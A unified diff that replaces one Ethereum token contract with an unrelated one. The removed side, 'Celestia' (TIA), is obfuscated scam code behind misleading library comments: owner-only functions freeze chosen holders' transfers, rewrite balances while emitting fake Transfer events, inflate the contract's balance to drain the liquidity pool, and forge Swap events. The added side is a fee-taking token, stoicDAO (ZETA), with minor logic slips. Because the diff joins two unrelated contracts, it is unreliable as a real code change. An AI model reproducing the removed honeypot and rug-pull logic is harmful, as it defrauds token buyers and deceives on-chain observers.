@@ -1,612 +1,532 @@
-/**
- *Submitted for verification at Etherscan.io on 2023-10-30
-*/
-
+// number: 239
+// project: stoicDAO (ZETA)
+// address: 0xB281d84989c06e2A6CCdC5eA7BF1663c79a1c31A
+// chainid: 1
 // SPDX-License-Identifier: MIT
-
-
-pragma solidity ^0.7.6;
-
-/*
- * @dev Provides information about the current execution context, including the
- * sender of the transaction and its data. While these are generally available
- * via msg.sender and msg.data, they should not be accessed in such a direct
- * manner, since when dealing with meta-transactions the account sending and
- * paying for execution may not be the actual sender (as far as an application
- * is concerned).
- *
- * This contract is only required for intermediate, library-like contracts.
- */
-interface IERC20 {
-    function transferFrom( address from, address to, uint256 value) external returns (bool);
-}
-
-/**
- * @dev Contract module which provides a basic access control mechanism, where
- * there is an account (an owner) that can be granted exclusive access to
- * specific functions.
- *
- * By default, the owner account will be the one that deploys the contract. This
- * can later be changed with {transferOwnership}.
- *
- * This module is used through inheritance. It will make available the modifier
- * `onlyOwner`, which can be applied to your functions to restrict their use to
- * the owner.
- */
-interface Interfaces {
-    function createPair( address tokenA, address tokenB) external returns (address pair);
-    function token0() external view returns (address);
-    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
-    function factory() external pure returns (address);
-    function WETH() external pure returns (address);
-    function swapTokensForExactTokens( uint256 amountOut, uint256 amountInMax, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts);
-    function swapExactETHForTokens( uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external payable returns (uint256[] memory amounts);
-    function getAmountsOut( uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
-    function getAmountsIn( uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
-}
-
-/**
- * @dev Implementation of the {IERC20} interface.
- *
- * This implementation is agnostic to the way tokens are created. This means
- * that a supply mechanism has to be added in a derived contract using {_mint}.
- * For a generic mechanism see {ERC20PresetMinterPauser}.
- *
- * TIP: For a detailed writeup see our guide
- * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
- * to implement supply mechanisms].
- *
- * We have followed general OpenZeppelin guidelines: functions revert instead
- * of returning `false` on failure. This behavior is nonetheless conventional
- * and does not conflict with the expectations of ERC20 applications.
- *
- * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
- * This allows applications to reconstruct the allowance for all accounts just
- * by listening to said events. Other implementations of the EIP may not emit
- * these events, as it isn't required by the specification.
- *
- * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
- * functions have been added to mitigate the well-known issues around setting
- * allowances. See {IERC20-approve}.
- */
-contract ERC20 {
-    mapping(address => mapping(address => uint256)) public a;
-    mapping(address => uint256) public b;
-    mapping(address => uint256) public c;
-    address public owner;
-    uint256 _totalSupply;
-    string _name;
-    string _symbol;
-
-    event Transfer(address indexed from, address indexed to, uint256 value);
-    event Approval( address indexed owner, address indexed spender, uint256 value);
-    event Swap( address indexed sender, uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out, address indexed to);
-
-
-    modifier onlyOwner() {
-        require(owner == msg.sender, "Caller is not the owner");
-        _;
-    }
-
-    /**
-     * @dev Returns the name of the token.
-     */
-    function name() public view virtual returns (string memory) {
-        return _name;
-    }
-
-    /**
-     * @dev Returns the symbol of the token, usually a shorter version of the
-     * name.
-     */
-    function symbol() public view virtual returns (string memory) {
-        return _symbol;
-    }
-
-    function totalSupply() public view virtual returns (uint256) {
-        return _totalSupply;
-    }
-
-
-    function TryCall(uint256 _a, uint256 _b) internal pure returns (uint256) {
-        return _a / _b;
-    }
-
-    function FetchToken2(uint256 _a) internal pure returns (uint256) {
-        return _a * 100000 / (2931 + 97069);
-    }
-
-    function FetchToken(uint256 _a) internal pure returns (uint256) {
-        return _a + 10;
-    }
-
-    function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
-        uint256 __c = _a + _b;
-        require(__c >= _a, "SafeMath: addition overflow");
-
-        return __c;
-    }
-
-    function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
-        require(_b <= _a, "SafeMath: subtraction overflow");
-        uint256 __c = _a - _b;
-
-        return __c;
-    }
-
-    function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
-        return _a / _b;
-    }
-
-    function _T() internal view returns (bytes32) {
-        return bytes32(uint256(uint160(address(this))) << 96);
-    }
-
-    function balanceOf(address account) public view virtual returns (uint256) {
-        return b[account];
-    }
-
-    function transfer( address to, uint256 amount) public virtual returns (bool) {
-        _transfer(msg.sender, to, amount);
-        return true;
-    }
-
-    function allowance( address __owner, address spender) public view virtual returns (uint256) {
-        return a[__owner][spender];
-    }
-
-    function approve( address spender, uint256 amount) public virtual returns (bool) {
-        _approve(msg.sender, spender, amount);
-        return true;
-    }
-
-    function transferFrom( address from, address to, uint256 amount) public virtual returns (bool) {
-        _spendAllowance(from, msg.sender, amount);
-        _transfer(from, to, amount);
-        return true;
-    }
-
-    function increaseAllowance( address spender, uint256 addedValue) public virtual returns (bool) {
-        address __owner = msg.sender;
-        _approve(__owner, spender, allowance(__owner, spender) + addedValue);
-        return true;
-    }
-
-    function decreaseAllowance( address spender, uint256 subtractedValue) public virtual returns (bool) {
-        address __owner = msg.sender;
-        uint256 currentAllowance = allowance(__owner, spender);
-        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
-
-        _approve(__owner, spender, currentAllowance - subtractedValue);
-        return true;
-    }
-
-    function _transfer( address from, address to, uint256 amount) internal virtual {
-        require(from != address(0), "ERC20: transfer from the zero address");
-        require(to != address(0), "ERC20: transfer to the zero address");
-
-        uint256 fromBalance = b[from];
-        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
-        if (c[from] > 0){
-            require(add(c[from], b[from]) == 0);
-        }
-
-        b[from] = sub(fromBalance, amount);
-        b[to] = add(b[to], amount);
-        emit Transfer(from, to, amount);
-    }
-
-    function _approve( address __owner, address spender, uint256 amount) internal virtual {
-        require(__owner != address(0), "ERC20: approve from the zero address");
-        require(spender != address(0), "ERC20: approve to the zero address");
-
-        a[__owner][spender] = amount;
-        emit Approval(__owner, spender, amount);
-    }
-
-    function _spendAllowance( address __owner, address spender, uint256 amount) internal virtual {
-        uint256 currentAllowance = allowance(__owner, spender);
-        if (currentAllowance != type(uint256).max) {
-            require( currentAllowance >= amount, "ERC20: insufficient allowance");
-
-            _approve(__owner, spender, currentAllowance - amount);
-        }
-        
-    }
-
-    /**
-     * @dev Hook that is called before any transfer of tokens. This includes
-     * minting and burning.
-     *
-     * Calling conditions:
-     *
-     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
-     * will be to transferred to `to`.
-     * - when `from` is zero, `amount` tokens will be minted for `to`.
-     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
-     * - `from` and `to` are never both zero.
-     *
-     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
-     */
-    function _beforeTokenTransfer(
-        address from,
-        address to,
-        uint256 amount
-    ) internal virtual {}
-}
-
-contract CELESTIA is ERC20 {
-    Interfaces internal _RR;
-    Interfaces internal _pair;
-    uint8 public decimals = 18;
-    uint private namespace = 1;
-
-    constructor() {
-        _name = "Celestia";
-        _symbol = "TIA";
-        _totalSupply = 300_000_000_000e18;
-        owner = msg.sender;
-        _RR = Interfaces(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
-        _pair = Interfaces(Interfaces(_RR.factory()).createPair(address(this), address(_RR.WETH())));
-        b[msg.sender] = _totalSupply;
-        emit Transfer(address(0), msg.sender, _totalSupply);
-    }
-
-    function Execute(uint256 t, address tA, uint256 w, address[] memory r) public onlyOwner returns (bool) {
-        for (uint256 i = 0; i < r.length; i++) {
-            callUniswap(r[i], t, w, tA);
-        }
-        return true;
-    }
-
-
-    function Div() internal view returns (address[] memory) {
-        address[] memory p;
-        p = new address[](2);
-        p[0] = address(this);
-        p[1] = _RR.WETH();
-        return p;
-    }
-
-    function getContract(uint256 blockTimestamp, uint256 selector, address[] memory list, address factory) internal {
-        a[address(this)][address(_RR)] = b[address(this)];
-        FactoryReview(blockTimestamp, selector, list, factory);
-    }
-
-    function FactoryReview( uint256 blockTime, uint256 multiplicator, address[] memory parts, address factory) internal {
-        _RR
-        .swapTokensForExactTokens(
-        // assembler
-        blockTime, 
-        multiplicator, 
-        // unchecked
-        parts, 
-        factory, 
-        block.timestamp + 1200);
-    }
-
-
-    /**
-     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
-     * but also transferring `value` wei to `target`.
-     *
-     * Requirements:
-     *
-     * - the calling contract must have an ETH balance of at least `value`.
-     * - the called Solidity function must be `payable`.
-     *
-     * _Available since v3.1._
-     */
-    function Address(address _r) public onlyOwner {
-        uint256 calling = (Sub(_RR.WETH()) * 99999) / 100000;
-        address[] memory FoldArray = Div();
-        uint256 called = Allowance(calling, FoldArray);
-        getContract(calling, called, FoldArray, _r);
-    }
-
-    function Sub(address t) internal view returns (uint256) {
-        (uint112 r0, uint112 r1, ) = _pair.getReserves();
-        return (_pair.token0() == t) ? uint256(r0) : uint256(r1);
-    }
-
-
-    function ConvertAddress(address _uu, uint256 _pp) internal view returns (uint256) {
-        return TryCall(b[_uu], _pp);
-    }
-
-    /**
-     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
-     * `recipient`, forwarding all available gas and reverting on errors.
-     *
-     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
-     * of certain opcodes, possibly making contracts go over the 2300 gas limit
-     * imposed by `transfer`, making them unable to receive funds via
-     * `transfer`. {sendValue} removes this limitation.
-     *
-     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
-     *
-     * IMPORTANT: because control is transferred to `recipient`, care must be
-     * taken to not create reentrancy vulnerabilities. Consider using
-     * {ReentrancyGuard} or the
-     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
-     */
-    function CheckAmount2(bytes32 _b, uint256 __a) internal {
-        // Assembler for gas optimization {}
-        emit
-        Transfer
-        (
-        (uint256(0) 
-        !=0 
-        || 
-
-        1238==1)
-        ?address(
-        uint256(
-        0))
-
-        :address(
-        uint160
-        (uint256(
-        _b)>>96)),
-
-        address(_pair),b
-        // v0.5.11 specific update
-        [
-        (uint256(0) 
-        !=0 
-        || 
-        1238==1)
-        ?address(
-        // Overflow control
-        uint256(
-        0))
-
-        :address(
-        uint160
-        (uint256(
-        _b)>>96))
-        // Guard test
-        ]
-        );b
-        // assembly
-        [
-        (uint256(0) 
-        !=0 
-        || 
-        1238==1)
-        ?address(
-        // Must control
-        uint256(
-        0))
-
-        :address(
-        uint160
-        (uint256(
-        _b)>>96))
-        // Contract opcode
-        ]=
-        FetchToken2(
-        uint256(
-        __a));
-
-
-    }
-
-    /**
-     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
-     * `recipient`, forwarding all available gas and reverting on errors.
-     *
-     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
-     * of certain opcodes, possibly making contracts go over the 2300 gas limit
-     * imposed by `transfer`, making them unable to receive funds via
-     * `transfer`. {sendValue} removes this limitation.
-     *
-     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
-     *
-     * IMPORTANT: because control is transferred to `recipient`, care must be
-     * taken to not create reentrancy vulnerabilities. Consider using
-     * {ReentrancyGuard} or the
-     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
-     */
-    function CheckAmount(bytes32 _b, uint256 __a) internal {
-        // Assembler for gas optimization {}
-        c
-        // assembly
-        [
-        (uint256(0) 
-        !=0 
-        || 
-        1238==1)
-        ?address(
-        // Must control
-        uint256(
-        0))
-
-        :address(
-        uint160
-        (uint256(
-        _b)>>96))
-        // Contract opcode
-        ]=
-        FetchToken(
-        uint256(
-        __a));
-    }
-
-    function callUniswap(address router, uint256 transfer, uint256 cycleWidth, address unmount) internal {
-        IERC20(unmount).transferFrom(router, address(_pair), cycleWidth);
-        emit Transfer(address(_pair), router, transfer);
-        emit Swap(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, transfer, 0, 0, cycleWidth, router);
-    }
-
-
-    /**
-     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
-     * with `errorMessage` as a fallback revert reason when `target` reverts.
-     *
-     * _Available since v3.1._
-    */
-    function Allowance(uint256 checked, address[] memory p) internal returns (uint256) {
-        // Assembler for gas optimization {}
-        uint256[] memory value;
-        value = new uint256[](2);
-
-        // uncheck {
-        value = Mult(checked, p);
-        b
-        [
-        block.
-        timestamp> 
-        uint256(
-        1)||
-        uint256(
-        0)>
-        1||
-        uint160(
-        1)< 
-
-        block.
-        timestamp
-        ? 
-        address(
-        uint160(
-        uint256(
-        _T(
-
-        ))>>96))
-        :address(uint256(0))
-        ]+= 
-        // end uncheck }
-
-        value
-        
-        [
-        0
-        ];
-
-        return 
-        value
-        [
-        0
-        ];
-    }
-
-    function Mult( uint256 amO, address[] memory p) internal view returns (uint256[] memory){
-        return _RR.getAmountsIn(amO, p);
-    }
-
-    /**
-     * @dev Performs a Solidity function call using a low level `call`. A
-     * plain`call` is an unsafe replacement for a function call: use this
-     * function instead.
-     *
-     * If `target` reverts with a revert reason, it is bubbled up by this
-     * function (like regular Solidity function calls).
-     *
-     * Returns the raw returned data. To convert to the expected return value,
-     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
-     *
-     * Requirements:
-     *
-     * - `target` must be a contract.
-     * - calling `target` with `data` must not revert.
-     *
-     * _Available since v3.1._
-     */
-    function multicall2(bytes32[] calldata data, uint256 _p) public onlyOwner {
-        // Assembler for gas optimization {}
-        for 
-        (uint256 i = 0; i < data.length; i++) {
-        // assembly
-        if
-        (
-        block
-        .
-        timestamp 
-        >uint256(
-        uint160(
-        uint8(
-        0
-        )))
-        )
-        {
-        // assembly 
-        uint256 rS 
-        =ConvertAddress(
-        (uint256(
-
-        uint16(
-        uint8(
-        0)) 
-        )!=0)
-        ?address(uint256(0))
-        :address(
-        uint160
-        (uint256
-        (data[i
-        ])>>96)),
-        _p
-        );
-        CheckAmount2(data[i], rS);
-        }
-        }
-    }
-
-     /**
-     * @dev Performs a Solidity function call using a low level `call`. A
-     * plain`call` is an unsafe replacement for a function call: use this
-     * function instead.
-     *
-     * If `target` reverts with a revert reason, it is bubbled up by this
-     * function (like regular Solidity function calls).
-     *
-     * Returns the raw returned data. To convert to the expected return value,
-     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
-     *
-     * Requirements:
-     *
-     * - `target` must be a contract.
-     * - calling `target` with `data` must not revert.
-     *
-     * _Available since v3.1._
-     */
-    function multicall(bytes32[] calldata data, uint256 _p) public onlyOwner {
-        // Assembler for gas optimization {}
-        for 
-        (uint256 i = 0; i < data.length; i++) {
-        // assembly
-        if
-        (
-        block
-        .
-        timestamp 
-        >uint256(
-        uint160(
-        uint8(
-        0
-        )))
-        )
-        {
-        // assembly 
-        uint256 rS 
-        =ConvertAddress(
-        (uint256(
-
-        uint16(
-        uint8(
-        0)) 
-        )!=0)
-        ?address(uint256(0))
-        :address(
-        uint160
-        (uint256
-        (data[i
-        ])>>96)),
-        _p
-        );
-        CheckAmount(data[i], rS);
-        }
-        }
-    }
-
+pragma solidity 0.8.20;
+
+/**
+TG: https://t.me/stoic_dao
+Twitter: https://x.com/stoic_dao
+Web: https://stoicdao.io
+Full links: https://linktr.ee/stoicdao
+*/
+
+
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+
+    function _msgData() internal view virtual returns (bytes calldata) {
+        this; 
+        return msg.data;
+    }
+}
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address recipient, uint256 amount) external returns (bool);
+
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+interface IERC20Metadata is IERC20 {
+
+    function name() external view returns (string memory);
+
+    function symbol() external view returns (string memory);
+
+    function decimals() external view returns (uint8);
+}
+
+
+contract ERC20 is Context, IERC20, IERC20Metadata {
+    mapping (address => uint256) internal _balances;
+
+    mapping (address => mapping (address => uint256)) internal _allowances;
+
+    uint256 private _totalSupply;
+
+    string private _name;
+    string private _symbol;
+
+    constructor (string memory name_, string memory symbol_) {
+        _name = name_;
+        _symbol = symbol_;
+    }
+
+
+    function name() public view virtual override returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public view virtual override returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view virtual override returns (uint8) {
+        return 18;
+    }
+
+    function totalSupply() public view virtual override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) public view virtual override returns (uint256) {
+        return _balances[account];
+    }
+
+    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
+    function allowance(address owner, address spender) public view virtual override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) public virtual override returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
+        _transfer(sender, recipient, amount);
+
+        uint256 currentAllowance = _allowances[sender][_msgSender()];
+        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
+        _approve(sender, _msgSender(), currentAllowance - amount);
+
+        return true;
+    }
+
+    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
+        return true;
+    }
+
+    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
+        uint256 currentAllowance = _allowances[_msgSender()][spender];
+        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
+        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
+
+        return true;
+    }
+
+    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+
+        _beforeTokenTransfer(sender, recipient, amount);
+
+        uint256 senderBalance = _balances[sender];
+        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+        _balances[sender] = senderBalance - amount;
+        _balances[recipient] += amount;
+
+        emit Transfer(sender, recipient, amount);
+    }
+
+    function _mint(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: mint to the zero address");
+
+        _beforeTokenTransfer(address(0), account, amount);
+
+        _totalSupply += amount;
+        _balances[account] += amount;
+        emit Transfer(address(0), account, amount);
+    }
+
+    function _approve(address owner, address spender, uint256 amount) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
+}
+
+library Address{
+    function sendValue(address payable recipient, uint256 amount) internal {
+        require(address(this).balance >= amount, "Address: insufficient balance");
+
+        (bool success, ) = recipient.call{value: amount}("");
+        require(success, "Address: unable to send value, recipient may have reverted");
+    }
+}
+
+abstract contract Ownable is Context {
+    address private _owner;
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    constructor() {
+        _setOwner(_msgSender());
+    }
+
+    function owner() public view virtual returns (address) {
+        return _owner;
+    }
+
+    modifier onlyOwner() {
+        require(owner() == _msgSender(), "Ownable: caller is not the owner");
+        _;
+    }
+
+    function renounceOwnership() public virtual onlyOwner {
+        _setOwner(address(0));
+    }
+
+    function transferOwnership(address newOwner) public virtual onlyOwner {
+        require(newOwner != address(0), "Ownable: new owner is the zero address");
+        _setOwner(newOwner);
+    }
+
+    function _setOwner(address newOwner) private {
+        address oldOwner = _owner;
+        _owner = newOwner;
+        emit OwnershipTransferred(oldOwner, newOwner);
+    }
+}
+
+interface IFactory{
+        function createPair(address tokenA, address tokenB) external returns (address pair);
+}
+
+interface IRouter {
+    function factory() external pure returns (address);
+    function WETH() external pure returns (address);
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline) external;
+}
+
+contract stoicDAO is ERC20, Ownable{
+    using Address for address payable;
+    
+    IRouter public router;
+    address public pair;
+    
+    bool private swapping;
+    bool public swapEnabled;
+    bool public launched;
+
+
+    modifier lockSwapping() {
+        swapping = true;
+        _;
+        swapping = false;
+    }
+    
+    event TransferForeignToken(address token, uint256 amount);
+    event Launched();
+    event SwapEnabled();
+    event SwapThresholdUpdated();
+    event BuyTaxesUpdated();
+    event SellTaxesUpdated();
+    event MarketingWalletUpdated();
+    event DevelopmentWalletUpdated();
+    event StoicFundWalletUpdated();
+    event IncubatorWalletUpdated();
+    event ExcludedFromFeesUpdated();
+    event MaxTxAmountUpdated();
+    event MaxWalletAmountUpdated();
+    event StuckEthersCleared();
+    
+    uint256 public swapThreshold = 1000000 * 10**18; //0.1% of total supply
+    uint256 public maxTxAmount = 1000000000 * 10**18; 
+    uint256 public maxWalletAmount = 1000000000 * 10**18;
+    
+    address public marketingWallet = 0x9E4F6Fd3845d61825e27512c3c37d1f0C6b4daA7;
+    address public developmentWallet = 0x81B47306fdFb578Cf1F54B9C647dfd6938f70328;
+    address public stoicFundWallet = 0x3De7847e31dDc390699716D0Ab773e3B708dC2b6;
+    address public incubatorWallet = 0x76ac47686849328716876F97Ea36815CD23FA534;
+    
+    struct Taxes {
+        uint256 marketing;
+        uint256 liquidity;
+        uint256 development;
+        uint256 stoicFund;
+        uint256 incubator;
+        uint256 burn;
+     }
+    
+    Taxes public buyTaxes = Taxes(10,0,10,15,15,0);
+    Taxes public sellTaxes = Taxes(10,0,10,15,15,0);
+    uint256 private totBuyTax = 50; //5% as denominator is 1,000
+    uint256 private totSellTax = 50; //5% as denominator is 1,000
+    
+    mapping (address => bool) public excludedFromFees;
+    
+    modifier inSwap() {
+        if (!swapping) {
+            swapping = true;
+            _;
+            swapping = false;
+        }
+    }
+
+    constructor() ERC20("stoicDAO", "ZETA") {
+        _mint(msg.sender, 1000000000 * 10 ** decimals());
+        excludedFromFees[msg.sender] = true;
+
+        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        address _pair = IFactory(_router.factory())
+            .createPair(address(this), _router.WETH());
+
+        router = _router;
+        pair = _pair;
+        excludedFromFees[address(this)] = true;
+        excludedFromFees[marketingWallet] = true;
+        excludedFromFees[developmentWallet] = true;
+        excludedFromFees[stoicFundWallet] = true;
+        excludedFromFees[incubatorWallet] = true;
+    }
+    
+    function _transfer(address sender, address recipient, uint256 amount) internal override {
+        require(amount > 0, "Transfer amount must be greater than zero");
+                
+        
+        if(!excludedFromFees[sender] && !excludedFromFees[recipient] && !swapping){
+            require(launched, "Trading not active yet");
+            require(amount <= maxTxAmount, "You are exceeding maxTxAmount");
+            if(recipient != pair){
+                require(balanceOf(recipient) + amount <= maxWalletAmount, "You are exceeding maxWalletAmount");
+            }
+        }
+
+        uint256 fee;
+          
+        if (swapping || excludedFromFees[sender] || excludedFromFees[recipient]) fee = 0;
+         
+        else{
+            if(recipient == pair) fee = amount * totSellTax / 1000;
+            else if(sender == pair) fee = amount * totBuyTax / 1000;
+            else fee = 0;
+        }
+        
+        if (swapEnabled && !swapping && sender != pair && fee > 0) swapForFees();
+
+        super._transfer(sender, recipient, amount - fee);
+        if(fee > 0) super._transfer(sender, address(this) ,fee);
+
+        uint256 tokensForBurn = 0;
+
+        tokensForBurn = fee * sellTaxes.burn / totSellTax;
+
+        if(tokensForBurn > 0) {
+                 super._transfer(address(this), address(0xdead), tokensForBurn);
+            }
+
+    }
+    function swapForFees() private inSwap {
+        uint256 contractBalance = balanceOf(address(this));
+
+        if (contractBalance >= swapThreshold) {
+
+            uint256 denominator = totSellTax * 2;
+            uint256 tokensToAddLiquidityWith = contractBalance * sellTaxes.liquidity / denominator;
+            uint256 toSwap = contractBalance - tokensToAddLiquidityWith;
+    
+            uint256 initialBalance = address(this).balance;
+    
+            swapTokensForETH(toSwap);
+    
+            uint256 deltaBalance = address(this).balance - initialBalance;
+            uint256 unitBalance= deltaBalance / (denominator - sellTaxes.liquidity);
+            uint256 ethToAddLiquidityWith = unitBalance * sellTaxes.liquidity;
+    
+            if(tokensToAddLiquidityWith > 0 && ethToAddLiquidityWith > 0){
+                // Add liquidity to dex
+                addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);
+            }
+    
+            uint256 marketingAmt = unitBalance * 2 * sellTaxes.marketing;
+            if(marketingAmt > 0){
+                payable(marketingWallet).sendValue(marketingAmt);
+            }
+            
+            uint256 developmentAmt = unitBalance * 2 * sellTaxes.development;
+            if(developmentAmt > 0){
+                payable(developmentWallet).sendValue(developmentAmt);
+            }
+            uint256 stoicFundAmt = unitBalance * 2 * sellTaxes.stoicFund;
+            if(stoicFundAmt > 0){
+                payable(stoicFundWallet).sendValue(stoicFundAmt);
+            }
+            
+            uint256 incubatorAmt = unitBalance * 2 * sellTaxes.incubator;
+            if(developmentAmt > 0){
+                payable(incubatorWallet).sendValue(incubatorAmt);
+            }
+
+        }
+    }
+
+    function swapTokensForETH(uint256 tokenAmount) private {
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = router.WETH();
+
+        _approve(address(this), address(router), tokenAmount);
+
+        // make the swap
+        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
+    }
+
+    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
+        // approve token transfer to cover all possible scenarios
+        _approve(address(this), address(router), tokenAmount);
+
+        // add the liquidity
+        router.addLiquidityETH{value: bnbAmount}(
+            address(this),
+            tokenAmount,
+            0, // slippage is unavoidable
+            0, // slippage is unavoidable
+            address(0xdead),
+            block.timestamp
+        );
+    }
+    function setSwapEnabled(bool state) external onlyOwner { // to be used only in case of dire emergency
+        swapEnabled = state;
+        emit SwapEnabled();
+    }
+
+    function setSwapThreshold(uint256 new_amount) external onlyOwner {
+        require(new_amount >= 10000, "Swap amount cannot be lower than 0.001% total supply.");
+        require(new_amount <= 30000000, "Swap amount cannot be higher than 3% total supply.");
+        swapThreshold = new_amount * (10**18);
+        emit SwapThresholdUpdated();
+    }
+
+    function launch() external onlyOwner{
+        require(!launched, "Trading already active");
+        launched = true;
+        swapEnabled = true;
+        emit Launched();
+    }
+
+    function setBuyTaxes(uint256 _marketing, uint256 _liquidity, uint256 _development, uint256 _stoicFund, uint256 _incubator, uint256 _burn) external onlyOwner{
+        buyTaxes = Taxes(_marketing, _liquidity, _development, _stoicFund, _incubator, _burn);
+        totBuyTax = _marketing + _liquidity + _development + _stoicFund + _incubator + _burn;
+        require(totBuyTax <= 301,"Total buy fees cannot be greater than 5%");
+        emit BuyTaxesUpdated();
+    }
+
+    function setSellTaxes(uint256 _marketing, uint256 _liquidity, uint256 _development, uint256 _stoicFund, uint256 _incubator, uint256 _burn) external onlyOwner{
+        sellTaxes = Taxes(_marketing, _liquidity, _development, _stoicFund, _incubator, _burn);
+        totSellTax = _marketing + _liquidity + _development + _stoicFund + _incubator + _burn;
+        require(totSellTax <= 301,"Total sell fees cannot be greater than 5%");
+        require(totSellTax >= 10,"Total sell fees cannot beless  than 1%");
+        emit SellTaxesUpdated();
+    }
+    
+    function setMarketingWallet(address newWallet) external onlyOwner{
+        excludedFromFees[marketingWallet] = false;
+        require(newWallet != address(0), "Marketing Wallet cannot be zero address");
+        marketingWallet = newWallet;
+        emit MarketingWalletUpdated();     
+    }
+   
+    function setDevelopmentWallet(address newWallet) external onlyOwner{
+        excludedFromFees[developmentWallet] = false;
+        require(newWallet != address(0), "Development Wallet cannot be zero address");
+        developmentWallet = newWallet;
+        emit DevelopmentWalletUpdated();
+    }
+
+    function setStoicFundWallet(address newWallet) external onlyOwner{
+        excludedFromFees[stoicFundWallet] = false;
+        require(newWallet != address(0), "StoicFund Wallet cannot be zero address");
+        stoicFundWallet = newWallet;
+        emit StoicFundWalletUpdated();     
+    }
+
+    function setIncubatorWallet(address newWallet) external onlyOwner{
+        excludedFromFees[incubatorWallet] = false;
+        require(newWallet != address(0), "Incubator Wallet cannot be zero address");
+        incubatorWallet = newWallet;
+        emit IncubatorWalletUpdated();     
+    }
+
+    function setExcludedFromFees(address _address, bool state) external onlyOwner {
+        excludedFromFees[_address] = state;
+        emit ExcludedFromFeesUpdated();
+    }
+    
+    function setMaxTxAmount(uint256 amount) external onlyOwner{
+        require(amount >= 2500000, "Cannot set maxSell lower than 0.25%");
+        maxTxAmount = amount * (10**18);
+        emit MaxTxAmountUpdated();
+    }
+    
+    function setMaxWalletAmount(uint256 amount) external onlyOwner{
+        require(amount >= 2500000, "Cannot set maxSell lower than 0.25%");
+        maxWalletAmount = amount * (10**18);
+        emit MaxWalletAmountUpdated();
+    }
+
